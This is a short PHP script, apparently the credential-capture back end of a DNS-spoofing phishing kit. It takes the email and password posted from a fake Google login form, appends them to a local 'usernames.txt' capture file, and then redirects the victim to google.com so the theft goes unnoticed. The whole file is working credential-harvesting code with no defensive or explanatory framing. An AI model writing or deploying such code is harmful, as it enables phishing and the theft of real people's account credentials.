<?php

file_put_contents("/root/rpi_gui_map/DNSSpoof/captures/usernames.txt", "Google Account: " . $_POST['Email'] . " Pass: " . $_POST['Passwd'] . "\n", FILE_APPEND);
header('Location: https://google.com/');
exit();
